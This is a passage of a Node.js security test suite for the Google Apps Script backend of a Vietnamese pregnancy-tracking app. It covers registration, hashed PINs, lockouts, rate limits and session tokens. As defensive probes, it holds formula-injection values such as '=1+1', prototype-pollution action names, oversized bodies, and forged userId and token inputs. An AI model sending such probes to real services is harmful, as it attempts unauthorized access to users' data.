/* =========================================================
   Test google_apps_script.js của Mẹ Bầu An Yên bằng Node (chủ: backend-dev T-B1; QA mở rộng ở T-QB).
   Nạp CHÍNH file script vào tests/lib/gas-sandbox.js (Sheet, Cache, Lock, Properties, Utilities giả).
   Không gọi mạng, không đụng Sheet thật. Chạy: node tests/test-gas.js     (FAIL → exit 1)
   Phủ: 12 action, S-01…S-13 (ADR 0005 mục 6), giới hạn tần suất (K-6), các ca tấn công:
   đọc/ghi dữ liệu người khác bằng sửa userId / token, đoán PIN đồng thời, chèn công thức, payload quá lớn,
   vị trí chạm sai, lock lỗi, lỗi nội bộ không lộ chi tiết.
   ========================================================= */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');
const { createGas, DEFAULT_START } = require('./lib/gas-sandbox');

const APP = path.resolve(__dirname, '..');
const SRC = fs.readFileSync(path.join(APP, 'google_apps_script.js'), 'utf8');
let passes = 0, fails = 0;
const T = (name, ok, detail) => {
  if (ok) passes++; else fails++;
  console.log((ok ? 'PASS ' : 'FAIL ') + name + (!ok && detail !== undefined ? '  → ' + String(typeof detail === 'string' ? detail : JSON.stringify(detail)).replace(/\s+/g, ' ').slice(0, 300) : ''));
};
const section = s => console.log('\n=== ' + s + ' ===');

/* ===== Dụng cụ ===== */
const ITER = 20;
const ENVS = [];
function fresh(opts) {
  const o = opts || {};
  const env = createGas(Object.assign({}, o, { consts: Object.assign({ PIN_HASH_ITER: ITER }, o.consts || {}) }));
  if (!o.noSetup) env.setup();
  ENVS.push(env);
  return env;
}
let seq = 0;
const newPhone = () => '0901' + String(100000 + (++seq)).slice(-6);          // 0901000001… (không chứa PIN mẫu)
const e164 = p => '+84' + p.slice(1);
const PIN = '258147', PIN2 = '369258', WRONG = '471936';
const DAY = '2026-10-29';                                                       // hôm nay theo giờ VN của đồng hồ giả
const HOUR = 3600000, DAYMS = 86400000;
let idSeq = 0;
const rid = () => 'rec' + String(++idSeq).padStart(17, '0');
const consent = (text) => ({ sheet: true, text: !!text, version: '0.2' });
function reg(env, phone, o) {
  const r = env.post(Object.assign({ action: 'register', phone, pin: PIN, privateDevice: false, consent: consent(false) }, o || {}));
  if (r.result !== 'success') throw new Error('register lỗi: ' + JSON.stringify(r));
  return r;
}
const save = (env, token, records) => env.post({ action: 'saveRecords', token, records });
const list = (env, token, extra) => env.post(Object.assign({ action: 'listMine', token }, extra || {}));
function kick(o) {
  return Object.assign({ kind: 'kick', id: rid(), startAgeMs: 30 * 60000, meal: 'dinner', h1: 5, h2: 0, total: 5, min4: 20, min10: null,
    level: 'green', hadYellow: false, reasons: [], feel: 'same', signs: [], gaDays: 200,
    taps: [{ t: 60000, x: 0.25, y: 0.75 }, { t: 120000, x: null, y: null }, { t: 600000, x: 0.5, y: 0.5 }, { t: 900000, x: 0.1, y: 0.9 }, { t: 1200000, x: 1, y: 0 }] }, o || {});
}
const checkin = o => Object.assign({ kind: 'checkin', id: rid(), ageMs: 0, emotions: ['worried', 'tired'], before: 7, after: 4, exercise: 'BREATHE_46', fit: 'fit', contexts: ['sleep'], minutes: 3 }, o || {});
const tg = o => Object.assign({ kind: 'thaigiao', id: rid(), ageMs: 0, day: DAY, prompt: 'TG-05', how: 'done' }, o || {});
const letter = o => Object.assign({ kind: 'letter', id: rid(), ageMs: 0, day: DAY, prompt: 'TG-05', text: 'Mẹ thương con' }, o || {});
const habit = o => Object.assign({ kind: 'habit', day: DAY, marks: { water: 'x', kick: 'a' }, ageMs: 0 }, o || {});
const profile = o => Object.assign({ kind: 'profile', edd: '2027-01-21', ageMs: 0 }, o || {});
const rows = (env, tab, which) => env.rows(tab, which);
const addDay = (d, n) => new Date(Date.parse(d + 'T00:00:00Z') + n * DAYMS).toISOString().slice(0, 10);
const lockWaits = env => env.lock.waits;
const sha256 = s => crypto.createHash('sha256').update(s).digest();
const PROTECTED = ['whoami', 'saveRecords', 'listMine', 'exportMine', 'deleteRecords', 'setConsent', 'deleteAccount'];
const DATA_TABS = ['NguoiDung', 'PhienDangNhap', 'DangNhapSai', 'ThoiQuen', 'CheckIn', 'ThaiGiao', 'DemConDap', 'DauChan', 'HoSo'];

/* =====================================================================
 * A. Cài đặt
 * ===================================================================== */
section('A. setup_, tab, pepper, file Chữ riêng');
{
  const env = fresh({ noSetup: true });
  T('chưa setup: ping ready=false', env.post({ action: 'ping' }).ready === false);
  const notReady = ['register', 'login', 'setPinAfterReset', 'logout', ...PROTECTED].every(a => env.post({ action: a, phone: newPhone(), pin: PIN }).error === 'server_not_ready');
  T('chưa setup: mọi action trừ ping → server_not_ready', notReady);
  env.setup();
  const pep = env.props.PIN_PEPPER;
  T('setup sinh PIN_PEPPER 64 hex', /^[0-9a-f]{64}$/.test(pep));
  T('setup tạo file Chữ riêng, ghi PRIVATE_SHEET_ID', !!env.privFile() && env.privFile().getName() === 'MBAY – Chữ riêng');
  T('file Chữ riêng có tab ChuRieng (và bỏ tab trống mặc định)', !!env.sheet('ChuRieng', 'priv') && env.privFile().getSheets().length === 1);
  T('file Dữ liệu đủ 9 tab, bỏ "Trang tính1" trống', DATA_TABS.every(n => env.sheet(n)) && env.dataFile.getSheets().length === 9, env.dataFile.getSheets().map(s => s.getName()));
  const schema = vm.runInNewContext(SRC.match(/var SCHEMA = \{\};[\s\S]*?(?=\n\/\/ Số cột)/)[0] + ';SCHEMA', { HABIT_ORDER: ['kick', 'thai_giao', 'breath', 'move', 'water', 'side_sleep'], HABITS: { kick: '👣 Đếm cử động thai', thai_giao: '💌 Thai giáo', breath: '🌬️ Thở / ngân', move: '🚶 Vận động sau ăn', water: '💧 Uống đủ nước', side_sleep: '🛏️ Ngủ nghiêng' }, TAB: env.ctx.TAB });
  T('tiêu đề hàng 1 đúng SCHEMA ở mọi tab', DATA_TABS.every(n => JSON.stringify(env.sheet(n).values()[0]) === JSON.stringify(schema[n].map(c => c[0]))));
  T('DemConDap có đủ cột đặc tả mục con 5.5 (+ Tuổi thai, Tuần thai)', JSON.stringify(env.sheet('DemConDap').values()[0].slice(0, 15)) === JSON.stringify(['Thời gian ghi (server)', 'Mã người dùng', 'Mã lượt', 'Giờ bắt đầu', 'Bữa', 'Số lần giờ 1', 'Số lần giờ 2', 'Tổng', 'Phút đạt 4', 'Phút đạt 10', 'Mức', 'Đã qua giờ cần chú ý', 'Lý do', 'Cảm nhận của mẹ', 'Dấu hiệu đã chọn']));
  T('đóng băng hàng 1', DATA_TABS.every(n => env.sheet(n).getFrozenRows() === 1));
  T('NguoiDung ẩn cột Muối…Khóa SĐT (I–N)', [9, 10, 11, 12, 13, 14].every(c => env.sheet('NguoiDung').isColumnHiddenByUser(c)) && !env.sheet('NguoiDung').isColumnHiddenByUser(2));
  T('cột SĐT, Ngày định dạng @ cả cột', env.sheet('NguoiDung').fmtAt(500, 2) === '@' && env.sheet('ThoiQuen').fmtAt(500, 2) === '@' && env.sheet('HoSo').fmtAt(500, 2) === '@');
  T('NguoiDung, PhienDangNhap, DangNhapSai có bảo vệ "chỉ cảnh báo"', ['NguoiDung', 'PhienDangNhap', 'DangNhapSai'].every(n => env.sheet(n).getProtections().length === 1 && env.sheet(n).getProtections()[0].isWarningOnly()));
  T('ping sau setup: ready=true, api "1"', JSON.stringify(env.post({ action: 'ping' })) === '{"result":"success","api":"1","ready":true}');
  const privId = env.props.PRIVATE_SHEET_ID;
  env.setup();
  T('chạy setup lần 2: KHÔNG đổi pepper, không tạo file mới, không nhân đôi bảo vệ', env.props.PIN_PEPPER === pep && env.props.PRIVATE_SHEET_ID === privId && Object.keys(env.files).length === 2 && env.sheet('NguoiDung').getProtections().length === 1);
  T('setup không log pepper', !env.logs.some(l => l.indexOf(pep) >= 0));
  const env2 = fresh({ noSetup: true });
  env2.props.PIN_PEPPER = 'abc';
  let threw = false; try { env2.setup(); } catch (e) { threw = true; }
  T('pepper có sẵn mà sai dạng: setup dừng, không ghi đè', threw && env2.props.PIN_PEPPER === 'abc');
  const env3 = fresh({ noSetup: true });
  env3.props.PRIVATE_SHEET_ID = 'khongco';
  threw = false; try { env3.setup(); } catch (e) { threw = true; }
  T('PRIVATE_SHEET_ID trỏ file không mở được: setup dừng, không tự tạo file mới', threw && Object.keys(env3.files).length === 1);
  const env4 = fresh({ noSetup: true });
  env4.setup(); delete env4.props.PRIVATE_SHEET_ID;
  T('thiếu PRIVATE_SHEET_ID → server_not_ready', env4.post({ action: 'login', phone: newPhone(), pin: PIN }).error === 'server_not_ready' && env4.post({ action: 'ping' }).ready === false);
  const chk = env.ctx.checkSetup_();
  T('checkSetup_ báo ổn, không hiện pepper', chk.ok === true && !chk.lines.join('\n').includes(pep), chk.lines);
  T('checkSetup_ trước setup báo cần sửa', env3.ctx.checkSetup_().ok === false);
  env.ctx.onOpen();
  const menu = env.menus[0];
  T('onOpen: menu "Mẹ Bầu An Yên" 3 mục, hàm có thật và không có dấu _ cuối', menu && menu.name === 'Mẹ Bầu An Yên' && menu.items.length === 3 && menu.items.every(i => typeof env.ctx[i.fn] === 'function' && !/_$/.test(i.fn)), menu);
  T('có hàm chạy được trong editor: setup, benchPinHash, selfTest, cleanupDaily', ['setup', 'benchPinHash', 'selfTest', 'cleanupDaily'].every(f => typeof env.ctx[f] === 'function'));
}

/* =====================================================================
 * B. doGet và thân request (S-05, S-08)
 * ===================================================================== */
section('B. doGet không trả dữ liệu; thân request');
{
  const env = fresh();
  const a = reg(env, newPhone());
  save(env, a.token, [habit()]);
  const reads = env.stats.sheetReads;
  const gets = [{}, { callback: 'x' }, { action: 'listMine', token: a.token }, { all: '1', format: 'json' }, { phone: '0901000001' }]
    .map(p => JSON.stringify(env.get(p)));
  T('doGet mọi tham số → chỉ public_read_disabled', gets.every(g => g === '{"result":"error","error":"public_read_disabled"}'), gets);
  T('doGet không đọc Sheet', env.stats.sheetReads === reads);
  T('doGet trả JSON (không JSONP)', env.lastMime === 'application/json');
  T('ALLOW_PUBLIC_READ = false trong mã', /var ALLOW_PUBLIC_READ = false;/.test(SRC));
  T('không postData → no_data', JSON.parse(env.postRaw(undefined).getContent()).error === 'no_data');
  T('thân rỗng → no_data', env.post('').error === 'no_data');
  T('thân > 60.000 ký tự → too_large', env.post(JSON.stringify({ action: 'ping', pad: 'x'.repeat(60000) })).error === 'too_large');
  T('thân đúng 60.000 ký tự vẫn nhận', (() => { const base = JSON.stringify({ action: 'ping', pad: '' }); return env.post(JSON.stringify({ action: 'ping', pad: 'x'.repeat(60000 - base.length) })).result === 'success'; })());
  T('JSON hỏng → bad_json', ['{', '[]', '"x"', 'null', '1', 'true'].every(b => env.post(b).error === 'bad_json'));
  const odd = ['', 'admin', '__proto__', 'constructor', 'toString', 'hasOwnProperty', 'doGet', 'setup_', 'resetPinFor_', 'getMyStats', 'LISTMINE'];
  T('action lạ / thiếu / tên hàm nội bộ → unknown_action', odd.every(x => env.post({ action: x }).error === 'unknown_action') && env.post({}).error === 'unknown_action' && env.post({ action: ['ping'] }).error === 'unknown_action');
  T('đúng 12 action', JSON.stringify(Object.keys(env.ctx.HANDLERS).sort()) === JSON.stringify(['deleteAccount', 'deleteRecords', 'exportMine', 'listMine', 'login', 'logout', 'ping', 'register', 'saveRecords', 'setConsent', 'setPinAfterReset', 'whoami']));
  T('mọi phản hồi doPost là JSON', (env.post({ action: 'ping' }), env.lastMime === 'application/json'));
}

/* =====================================================================
 * C. register
 * ===================================================================== */
section('C. register');
{
  const env = fresh();
  const p = newPhone();
  const bad = [['', 'phone_invalid'], ['123', 'phone_invalid'], ['=1+1', 'phone_invalid'], ['+1 650 253 0000', 'phone_invalid'], ['0201234567', 'phone_invalid'], ['0912345678'.repeat(4), 'phone_invalid']];
  T('SĐT sai → phone_invalid', bad.every(([ph, e]) => env.post({ action: 'register', phone: ph, pin: PIN, consent: consent() }).error === e) &&
    env.post({ action: 'register', phone: null, pin: PIN, consent: consent() }).error === 'phone_invalid' &&
    env.post({ action: 'register', phone: { a: 1 }, pin: PIN, consent: consent() }).error === 'phone_invalid');
  const badPins = ['12345', '1234567', 'abcdef', '12 456', '', '２５８１４７', ' 258147'];
  T('PIN không đủ 6 chữ số → pin_invalid', badPins.every(x => env.post({ action: 'register', phone: p, pin: x, consent: consent() }).error === 'pin_invalid') &&
    env.post({ action: 'register', phone: p, pin: 258147, consent: consent() }).error === 'pin_invalid' &&
    env.post({ action: 'register', phone: p, consent: consent() }).error === 'pin_invalid');
  const weak = ['000000', '111111', '999999', '123456', '234567', '012345', '456789', '654321', '987654', '543210', '123123', '258258', '121212', '474747',
    p.slice(-6), '112233', '123321', '666888', '888888', '168168', '686868'];
  const weakRes = weak.map(x => env.post({ action: 'register', phone: p, pin: x, consent: consent() }).error);
  T('PIN dễ đoán → pin_weak (đủ luật ADR 4.3, gồm 6 số cuối SĐT)', weakRes.every(e => e === 'pin_weak'), weak.filter((x, i) => weakRes[i] !== 'pin_weak'));
  T('PIN bình thường không bị coi là yếu', ['258147', '369258', '471936', '102938', '135790'].every(x => !env.ctx.isWeakPin_(x, e164(p))));
  const noC = [undefined, {}, { sheet: false, version: '0.2' }, { sheet: 'true', version: '0.2' }, { sheet: true }, { sheet: true, version: '=1+1' }, { sheet: true, version: '0.2', text: 'yes' }];
  T('thiếu / sai đồng ý Sheet → consent_required', noC.every(c => env.post({ action: 'register', phone: p, pin: PIN, consent: c }).error === 'consent_required'));
  T('lỗi kiểm dữ liệu không ghi gì', rows(env, 'NguoiDung').length === 0);
  const r = env.post({ action: 'register', phone: p.slice(0, 4) + ' ' + p.slice(4, 7) + ' ' + p.slice(7), pin: PIN, privateDevice: false, consent: consent(false), userId: 'uFAKE', uid: 'uFAKE' });
  T('đăng ký thành công → Session đủ trường', r.result === 'success' && /^[0-9a-f]{64}$/.test(r.token) && /^[0-9a-f]{12}$/.test(r.acct) &&
    r.phoneMasked === '+849 ••• ••' + p.slice(-3) && JSON.stringify(r.consent) === '{"sheet":true,"text":false,"version":"0.2"}' && r.habits === null && r.edd === null, r);
  T('phiên ngắn (không tick máy riêng) hạn 12 giờ', r.exp === DEFAULT_START + 12 * HOUR);
  const u = rows(env, 'NguoiDung')[0];
  T('NguoiDung: SĐT dạng 0xxxxxxxxx là CHUỖI (giữ số 0 đầu)', u[1] === p && typeof u[1] === 'string');
  T('NguoiDung: mã người dùng ngẫu nhiên u + 23 hex, không lấy uid client gửi', /^u[0-9a-f]{23}$/.test(u[0]) && u[0] !== 'uFAKE');
  T('NguoiDung: muối 32 hex, băm 64 hex, số vòng, khóa SĐT 64 hex', /^[0-9a-f]{32}$/.test(u[8]) && /^[0-9a-f]{64}$/.test(u[9]) && u[10] === ITER && /^[0-9a-f]{64}$/.test(u[13]));
  T('NguoiDung: đồng ý ghi phiên bản + ngày, chữ tự viết tắt', u[4] === 'Sheet 0.2 · 29/10/2026' && u[5] === '');
  T('acct = 12 hex đầu SHA-256("acct|"+uid)', r.acct === sha256('acct|' + u[0]).toString('hex').slice(0, 12));
  const variants = [p, e164(p), '84' + p.slice(1), p.replace(/(\d{4})(\d{3})(\d{3})/, '$1.$2.$3')];
  T('cùng số viết kiểu khác (+84, 84, chấm) → phone_taken', variants.every(v => env.post({ action: 'register', phone: v, pin: PIN2, consent: consent() }).error === 'phone_taken'));
  T('vẫn chỉ một dòng NguoiDung', rows(env, 'NguoiDung').length === 1);
  const r2 = env.post({ action: 'register', phone: newPhone(), pin: PIN, privateDevice: true, consent: consent(true) });
  T('tick máy riêng → hạn 30 ngày; đồng ý chữ tự viết bật', r2.exp === DEFAULT_START + 30 * DAYMS && r2.consent.text === true && rows(env, 'NguoiDung')[1][5] === 'Có · 29/10/2026');
  T('privateDevice không phải true (chuỗi "true") → phiên ngắn', env.post({ action: 'register', phone: newPhone(), pin: PIN, privateDevice: 'true', consent: consent() }).exp === DEFAULT_START + 12 * HOUR);
}

/* =====================================================================
 * D. S-01 Không đăng nhập chỉ bằng SĐT
 * ===================================================================== */
section('D. S-01 không đăng nhập chỉ bằng SĐT');
{
  const env = fresh();
  const p = newPhone(); reg(env, p);
  const rs = [{}, { pin: '' }, { pin: null }, { pin: 0 }, { pin: [] }].map(x => env.post(Object.assign({ action: 'login', phone: p }, x)));
  T('thiếu PIN / PIN rỗng / sai kiểu → pin_invalid, không token', rs.every(r => r.error === 'pin_invalid' && !r.token));
  T('setPinAfterReset không có đặt lại → bad_credentials', env.post({ action: 'setPinAfterReset', phone: p, code: '123456', pin: PIN2 }).error === 'bad_credentials');
  T('setPinAfterReset thiếu mã → bad_credentials', env.post({ action: 'setPinAfterReset', phone: p, pin: PIN2 }).error === 'bad_credentials');
  env.resetPin(p);
  T('đang chờ đặt lại (băm PIN trống): PIN cũ không đăng nhập được', env.post({ action: 'login', phone: p, pin: PIN }).error === 'bad_credentials');
  const makers = SRC.split(/\nfunction /).filter(f => /createSession_\(/.test(f) && !/^createSession_\(/.test(f)).map(f => f.slice(0, f.indexOf('(')));
  T('Session chỉ sinh ở register_ và credentialFlow_ (login / setPinAfterReset), sau khi so PIN / mã', JSON.stringify(makers) === '["register_","credentialFlow_"]', makers);
}

/* =====================================================================
 * E. S-02 Băm PIN
 * ===================================================================== */
section('E. S-02 PIN chỉ lưu dạng băm, muối riêng, pepper, nhiều vòng');
{
  const env = fresh();
  const pa = newPhone(), pb = newPhone();
  const ra = reg(env, pa), rb = reg(env, pb);
  const la = env.post({ action: 'login', phone: pa, pin: PIN, privateDevice: true });
  const [ua, ub] = rows(env, 'NguoiDung');
  T('hai người cùng PIN: muối khác, băm khác', ua[8] !== ub[8] && ua[9] !== ub[9]);
  let h = sha256(env.props.PIN_PEPPER + '|' + ua[8] + '|' + PIN);
  for (let i = 1; i < ITER; i++) h = sha256(h);
  T('băm = SHA-256(pepper|muối|PIN) lặp đúng số vòng, byte có dấu đổi hex đúng', h.toString('hex') === ua[9]);
  const cells = env.allCells();
  T('không ô nào (cả hai file) chứa PIN thô', !cells.some(c => String(c.v).includes(PIN)));
  T('không ô nào chứa token thô', ![ra.token, rb.token, la.token].some(t => cells.some(c => String(c.v).includes(t))));
  T('không log nào chứa PIN / token / pepper', !env.logs.some(l => l.includes(PIN) || l.includes(ra.token) || l.includes(env.props.PIN_PEPPER)));
  const respText = JSON.stringify([ra, rb, la]);
  T('phản hồi không chứa PIN, muối, băm', !respText.includes(PIN) && !respText.includes(ua[8]) && !respText.includes(ua[9]));
  T('mã không có Logger.log/console.log dính pin|token|body|contents', !SRC.split('\n').some(l => /(Logger\.log|console\.(log|info|warn|error))\(/.test(l) && /\b(pin|token|body|contents|d\.pin|tk)\b/.test(l.replace(/\/\/.*$/, '').replace(/'[^']*'/g, ''))));
  const env2 = fresh({ consts: { PIN_HASH_ITER: 10 } });
  const p2 = newPhone(); reg(env2, p2);
  const before = rows(env2, 'NguoiDung')[0];
  env2.ctx.PIN_HASH_ITER = 25;
  const l2 = env2.post({ action: 'login', phone: p2, pin: PIN });
  const after = rows(env2, 'NguoiDung')[0];
  T('tăng PIN_HASH_ITER: đăng nhập đúng thì băm lại với số vòng mới', l2.result === 'success' && after[10] === 25 && after[9] !== before[9] && after[8] !== before[8]);
  T('sau băm lại vẫn đăng nhập được, PIN sai vẫn sai', env2.post({ action: 'login', phone: p2, pin: PIN }).result === 'success' && env2.post({ action: 'login', phone: p2, pin: WRONG }).error === 'bad_credentials');
  const env3 = fresh({ consts: { PIN_HASH_ITER: 300 } });
  const p3 = newPhone(); reg(env3, p3);
  const d0 = env3.stats.digestInLock;
  env3.post({ action: 'login', phone: p3, pin: PIN });
  env3.post({ action: 'login', phone: p3, pin: WRONG });
  env3.post({ action: 'setPinAfterReset', phone: p3, code: '000000', pin: PIN2 });
  T('không băm PIN trong lock (login, setPinAfterReset)', env3.stats.digestInLock - d0 < 20, env3.stats.digestInLock - d0);
  const d1 = env3.stats.digestInLock;
  reg(env3, newPhone());
  T('không băm PIN trong lock (register)', env3.stats.digestInLock - d1 < 20);
}

/* =====================================================================
 * F. S-03 Khóa 5 lần sai / 15 phút, đếm theo SĐT, kể cả số chưa đăng ký; K-6
 * ===================================================================== */
section('F. S-03 khóa 5 lần sai, câu giống nhau, thử đồng thời, giới hạn chung');
{
  const env = fresh();
  const p = newPhone(); reg(env, p);
  const seqA = [1, 2, 3, 4, 5].map(() => env.post({ action: 'login', phone: p, pin: WRONG }));
  T('sai 1…4 → bad_credentials còn 4,3,2,1', seqA.slice(0, 4).map(r => r.error + r.remaining).join() === 'bad_credentials4,bad_credentials3,bad_credentials2,bad_credentials1', seqA);
  T('sai lần 5 → còn 0 lần, kèm retryAfterSec 900', seqA[4].error === 'bad_credentials' && seqA[4].remaining === 0 && seqA[4].retryAfterSec === 900);
  const lk = env.post({ action: 'login', phone: p, pin: PIN });
  T('đang khóa: PIN ĐÚNG vẫn bị locked, không token', lk.error === 'locked' && lk.retryAfterSec > 0 && lk.retryAfterSec <= 900 && !lk.token, lk);
  env.cache = {}; Object.keys(env.cache).forEach(k => delete env.cache[k]);
  T('khóa nằm ở server (xóa đệm vẫn khóa)', env.post({ action: 'login', phone: p, pin: PIN }).error === 'locked');
  T('đăng ký lại số đang khóa vẫn phone_taken (không vòng qua khóa)', env.post({ action: 'register', phone: p, pin: PIN2, consent: consent() }).error === 'phone_taken');
  env.advance(15 * 60000 + 1000);
  const ok = env.post({ action: 'login', phone: p, pin: PIN });
  T('hết 15 phút: PIN đúng vào được', ok.result === 'success');
  T('đăng nhập đúng → đếm về 0 (sai tiếp còn 4)', env.post({ action: 'login', phone: p, pin: WRONG }).remaining === 4);
  env.post({ action: 'login', phone: p, pin: WRONG });
  env.advance(25 * HOUR);
  T('lần sai cũ hơn 24 giờ → đếm lại từ đầu', env.post({ action: 'login', phone: p, pin: WRONG }).remaining === 4);

  // Câu giống hệt cho số chưa đăng ký
  const envB = fresh();
  const pr = newPhone(), pu = newPhone(); reg(envB, pr);
  const strip = r => JSON.stringify(r);
  const a = [], b = [];
  for (let i = 0; i < 6; i++) { a.push(strip(envB.post({ action: 'login', phone: pr, pin: WRONG }))); b.push(strip(envB.post({ action: 'login', phone: pu, pin: WRONG }))); }
  T('số chưa đăng ký nhận ĐÚNG cùng chuỗi phản hồi, cùng số lần còn lại, cùng khóa', a.join() === b.join(), [a, b]);
  T('DangNhapSai không lưu SĐT thô của số chưa đăng ký (chỉ HMAC)', rows(envB, 'DangNhapSai').every(r => /^[0-9a-f]{64}$/.test(r[0])) && !envB.allCells().some(c => String(c.v).includes(pu.slice(1))));
  const envC = fresh();
  const pc = newPhone(), pd = newPhone(); reg(envC, pc);
  const c0 = envC.stats.digest; envC.post({ action: 'login', phone: pc, pin: WRONG }); const c1 = envC.stats.digest;
  envC.post({ action: 'login', phone: pd, pin: WRONG }); const c2 = envC.stats.digest;
  T('số chưa đăng ký vẫn băm đủ vòng (thời gian trả lời như nhau)', Math.abs((c1 - c0) - (c2 - c1)) <= 2 && (c2 - c1) >= ITER, [c1 - c0, c2 - c1]);

  // 30 lượt thử ĐỒNG THỜI: mọi lượt đều chen vào lúc lượt trước đang băm (ngoài lock)
  const envD = fresh();
  const pD = newPhone(); reg(envD, pD);
  const results = [];
  let started = 1, depth = 0;
  const fired = new Set();
  const pinFor = i => (i === 12 ? PIN : String(100000 + i * 7919).slice(-6));
  envD.hooks.onDigest = info => {
    if (!info.bytes || info.inLock || fired.has(depth) || started >= 30) return;
    fired.add(depth); depth++;
    envD.hooks._inHook = false;
    try { while (started < 30) { const i = started++; results.push({ i, r: envD.post({ action: 'login', phone: pD, pin: pinFor(i) }) }); } }
    finally { depth--; envD.hooks._inHook = true; }
  };
  const first = envD.post({ action: 'login', phone: pD, pin: WRONG });
  envD.hooks.onDigest = null;
  results.push({ i: 0, r: first });
  const nBad = results.filter(x => x.r.error === 'bad_credentials').length;
  const nLocked = results.filter(x => x.r.error === 'locked').length;
  T('30 lượt thử đồng thời: đủ 30 phản hồi', results.length === 30, results.length);
  T('30 lượt đồng thời: chỉ ≤ 5 lượt được băm/so (giữ chỗ trước khi băm)', nBad <= 5 && nBad >= 1 && nLocked === 30 - nBad, { nBad, nLocked });
  T('30 lượt đồng thời: lượt có PIN ĐÚNG cũng bị khóa, không token', results.find(x => x.i === 12).r.error === 'locked' && !results.some(x => x.r.token));
  T('sau loạt thử: số đang khóa 15 phút', envD.post({ action: 'login', phone: pD, pin: PIN }).error === 'locked');
  T('thử đồng thời không làm vỡ lock (không lượt nào server_busy)', !results.some(x => x.r.error === 'server_busy'));

  // Giới hạn chung toàn hệ thống (K-6): hằng thật 30 / 120; thử với 3 / 6 cho nhanh
  T('hằng GLOBAL_FAIL_SLOW_PER_MIN = 30, STOP = 120 trong mã', /var GLOBAL_FAIL_SLOW_PER_MIN = 30;/.test(SRC) && /var GLOBAL_FAIL_STOP_PER_MIN = 120;/.test(SRC));
  const envE = fresh({ consts: { GLOBAL_FAIL_SLOW_PER_MIN: 3, GLOBAL_FAIL_STOP_PER_MIN: 6 } });
  const pE = newPhone(); reg(envE, pE);
  for (let i = 0; i < 3; i++) envE.post({ action: 'login', phone: newPhone(), pin: WRONG });
  T('≤ 3 lần sai/phút toàn hệ thống: không chậm', envE.stats.sleeps.length === 0);
  envE.post({ action: 'login', phone: newPhone(), pin: WRONG });
  T('> 3 lần sai/phút (nhiều số khác nhau): chậm 1,5 s mỗi lượt sai', envE.stats.sleeps.length === 1 && envE.stats.sleeps[0] === 1500);
  for (let i = 0; i < 3; i++) envE.post({ action: 'login', phone: newPhone(), pin: WRONG });
  const rl = envE.post({ action: 'login', phone: pE, pin: PIN });
  T('> 6 lần sai/phút: mọi lượt đăng nhập (kể cả đúng) → rate_limited 60 s', rl.error === 'rate_limited' && rl.retryAfterSec === 60 && !rl.token, rl);
  T('rate_limited cả setPinAfterReset', envE.post({ action: 'setPinAfterReset', phone: pE, code: '123456', pin: PIN2 }).error === 'rate_limited');
  envE.advance(61000);
  T('qua phút sau: đăng nhập lại được', envE.post({ action: 'login', phone: pE, pin: PIN }).result === 'success');
}

/* =====================================================================
 * G. S-04 Token
 * ===================================================================== */
section('G. S-04 token có hạn, lưu băm, mọi đọc/ghi kèm token, userId từ token');
{
  const env = fresh();
  const pa = newPhone(), pb = newPhone();
  const a = reg(env, pa), b = reg(env, pb);
  const badTokens = [undefined, '', 'x', a.token.toUpperCase(), a.token.slice(0, 63), a.token + '0', 123, ['t'], { t: a.token }, crypto.randomBytes(32).toString('hex')];
  const okAll = PROTECTED.every(act => badTokens.every(t => env.post({ action: act, token: t, records: [], items: [], text: true, confirm: 'DELETE' }).error === 'session_expired'));
  T('7 action cần token: thiếu / sai dạng / không có → session_expired', okAll);
  T('token qua tham số khác (userId, phone, uid) không thay được token', env.post({ action: 'whoami', userId: rows(env, 'NguoiDung')[0][0], phone: pa }).error === 'session_expired');
  const sess = rows(env, 'PhienDangNhap');
  T('PhienDangNhap lưu SHA-256(token), không lưu token', sess.some(r => r[0] === sha256(a.token).toString('hex')) && !sess.some(r => r.includes(a.token)));
  T('token 64 hex khác nhau mỗi lần', a.token !== b.token && /^[0-9a-f]{64}$/.test(a.token));
  // AC-95: A gửi token A kèm userId / phone / uid của B
  const uidB = rows(env, 'NguoiDung')[1][0];
  const sv = env.post({ action: 'saveRecords', token: a.token, userId: uidB, uid: uidB, phone: pb, records: [habit({ userId: uidB, uid: uidB })] });
  const ht = rows(env, 'ThoiQuen');
  T('AC-95: ghi kèm userId của B → dòng thuộc A', sv.saved.length === 1 && ht.length === 1 && ht[0][0] === rows(env, 'NguoiDung')[0][0]);
  const lb = env.post({ action: 'listMine', token: a.token, userId: uidB, phone: pb });
  const lbb = env.post({ action: 'listMine', token: b.token });
  T('AC-95: đọc kèm userId của B → chỉ thấy dữ liệu A', lb.records.habit.length === 1 && lbb.records.habit.length === 0);
  T('whoami kèm phone của B → vẫn là A', env.post({ action: 'whoami', token: a.token, phone: pb }).phoneMasked.endsWith(pa.slice(-3)));
  // Hết hạn
  env.post({ action: 'whoami', token: a.token });   // nạp đệm
  env.advance(12 * HOUR - 1000);
  T('phiên ngắn còn hạn ở 11 giờ 59 phút', env.post({ action: 'whoami', token: a.token }).result === 'success');
  env.advance(2000);
  T('phiên ngắn hết hạn sau 12 giờ (kể cả còn trong đệm)', env.post({ action: 'whoami', token: a.token }).error === 'session_expired');
  const env2 = fresh();
  const p2 = newPhone(); reg(env2, p2);
  const pv = env2.post({ action: 'login', phone: p2, pin: PIN, privateDevice: true });
  env2.advance(29 * DAYMS);
  T('máy riêng: còn hạn ở ngày 29', env2.post({ action: 'whoami', token: pv.token }).result === 'success');
  env2.advance(DAYMS + 1000);
  T('máy riêng: hết hạn sau 30 ngày', env2.post({ action: 'whoami', token: pv.token }).error === 'session_expired');
  // Thu hồi
  const env3 = fresh();
  const p3 = newPhone(); const s3 = reg(env3, p3);
  env3.post({ action: 'whoami', token: s3.token });
  T('logout → thành công', env3.post({ action: 'logout', token: s3.token }).result === 'success');
  T('token đã thu hồi → session_expired ngay (đệm đã xóa)', env3.post({ action: 'whoami', token: s3.token }).error === 'session_expired');
  T('PhienDangNhap ghi "Có" ở cột Thu hồi', rows(env3, 'PhienDangNhap')[0][5] === 'Có');
  const s4 = env3.post({ action: 'login', phone: p3, pin: PIN });
  Object.keys(env3.cache).forEach(k => delete env3.cache[k]);
  T('đệm mất (CacheService bị dọn): token vẫn đúng nhờ đọc Sheet', env3.post({ action: 'whoami', token: s4.token }).result === 'success');
  env3.sheet('NguoiDung').deleteRows(2, 1);
  T('dòng người dùng bị xóa tay → session_expired, không lỗi', env3.post({ action: 'whoami', token: s4.token }).error === 'session_expired' && env3.post({ action: 'saveRecords', token: s4.token, records: [habit()] }).error === 'session_expired');
